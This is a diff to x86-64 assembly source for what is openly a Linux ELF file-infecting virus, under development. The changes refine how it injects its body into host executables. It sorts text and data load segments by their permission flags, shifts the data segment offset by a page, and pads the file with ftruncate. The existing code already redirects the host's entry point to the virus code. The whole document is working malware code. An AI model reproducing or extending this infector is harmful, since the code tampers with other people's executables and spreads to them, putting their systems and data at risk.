@@ -234,6 +234,7 @@ SYS_MUNMAP		equ 0xB
 SYS_PREAD64 	equ 0x11
 SYS_PWRITE64 	equ 0x12
 SYS_EXIT		equ 0x3c
+SYS_FTRUNCATE	equ 0x4d
 SYS_GETDENTS64	equ 0x4e
 SYS_CREAT		equ 0x55
 
@@ -297,6 +298,11 @@ oshoff: dq 0
 hostentry_offset: dd 0
 hosttext_start: dd 0
 
+data_offset_new_padding: dd 0
+data_offset_original: dd 0
+
+padding2data_segment equ	data_offset_new_padding-data_offset_original
+
 vxhostentry: dq 0
 vxoffset: dd 0
 ventry equ $_start 
@@ -351,6 +357,9 @@ DT_REG 			equ 0x8
 ;PHDR vals
 ;PT_LOAD 	dd 1
 PT_LOAD 	equ 0x1
+PFLAG_R	equ 0x4
+PFLAG_X	equ 0x1
+PFLAG_W	equ 0x2
 
 MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
@@ -737,6 +746,7 @@ infect:
 ;
 ;****************************************************************************************
 	xor rcx, rcx
+	xor r11, r11
 	mov word cx, [r13 + elf_ehdr.e_phnum]
 	check_phdrs:
 		;push rdx
@@ -746,23 +756,35 @@ infect:
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				mov rdx, checkptloadpasslen
-				lea rsi, checkptloadpass
-				mov rdi, STDOUT
-				mov rax, SYS_WRITE
-				syscall
-				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-				add r10, [r13 + r12 + elf_phdr.p_filesz]
-				mov qword [evaddr], r10				;save evaddr
-				;add dword r10d, [ventry]				;new entry point of infected file = evaddr + ventry
-				mov dword [r13 + elf_ehdr.e_entry], r10d	; update ELF header entry point to point to virus code start
-				mov r10, [r13 + r12 + elf_phdr.p_offset] 
-				mov dword [hosttext_start], r10d
-				add r10, [r13 + r12 + elf_phdr.p_filesz]				
-				mov dword [vxoffset], r10d
-				add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
-				add qword [r13 + r12 + elf_phdr.p_memsz], vlen	
-
+				cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_X)
+				je .mod_phdr_text_segment			
+				cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_W)
+				je .mod_phdr_data_segment			
+				jne .mod_subsequent_phdr
+				.mod_phdr_text_segment:			
+					mov rdx, checkptloadpasslen
+					lea rsi, checkptloadpass
+					mov rdi, STDOUT
+					mov rax, SYS_WRITE
+					syscall
+					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					add r10, [r13 + r12 + elf_phdr.p_filesz]
+					mov qword [evaddr], r10				;save evaddr
+					;add dword r10d, [ventry]				;new entry point of infected file = evaddr + ventry
+					mov dword [r13 + elf_ehdr.e_entry], r10d	; update ELF header entry point to point to virus code start
+					mov r10, [r13 + r12 + elf_phdr.p_offset] 
+					mov dword [hosttext_start], r10d
+					add r10, [r13 + r12 + elf_phdr.p_filesz]				
+					mov dword [vxoffset], r10d
+					add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
+					add qword [r13 + r12 + elf_phdr.p_memsz], vlen
+					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
+				.mod_phdr_data_segment:			
+					mov r11d, dword [r13 + r12 + elf_phdr.p_offset]
+					mov dword [data_offset_original],  r11d
+					add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
+					mov dword [data_offset_new_padding],  r11d
+					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
 				mov rdx, checkptloadfaillen
 				lea rsi, checkptloadfail
@@ -891,7 +913,7 @@ frankenstein_elf:
 		;mov rdx, [hosttext_start]
 		;mov rdx, [evaddr]
 		mov rdx, [vxoffset]
-		jmp .write_ehdr_phdrs
+		jmp .write_host_ehdr_phdrs_textsegment
 	.offset_ehdr_phdr_copy_pagesize:
 		;mov rdx, textsegmentoffset_pageyes_len
 		;lea rsi, textsegmentoffset_pageyes
@@ -901,7 +923,7 @@ frankenstein_elf:
 		
 		;xor rdx, rdx	
 		mov rdx, [PAGESIZE]
-	.write_ehdr_phdrs:	
+	.write_host_ehdr_phdrs_textsegment:	
 		;mov rdx, 512
 		;mov rdx, 64
 		;mov rdx, 1024
@@ -916,7 +938,7 @@ frankenstein_elf:
 		;mov rax, SYS_LSEEK
 		;syscall
 
-	.write_padding_until_textsegment:		
+;	.write_padding_until_datasegment:		
 		;mov rdx, evaddr
 		;sub rdx, [hostentry_offset]
 ;;		add rdx, hosttext_start
@@ -952,6 +974,18 @@ frankenstein_elf:
 		mov rsi, _start
 		mov r10, [vxoffset]
 		mov rax, SYS_PWRITE64
+		syscall
+	
+	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
+	; by n bytes, where n is a signed integer, passed in rsi
+	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
+	;before we write the original host data segment to the temp file
+	.write_padding_after_vx:
+		;mov rdx, [padding2data_segment] 
+		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+		mov rsi, [data_offset_new_padding]
+		sub rsi, [data_offset_original]
+		mov rax, SYS_FTRUNCATE
 		syscall
 		
 		
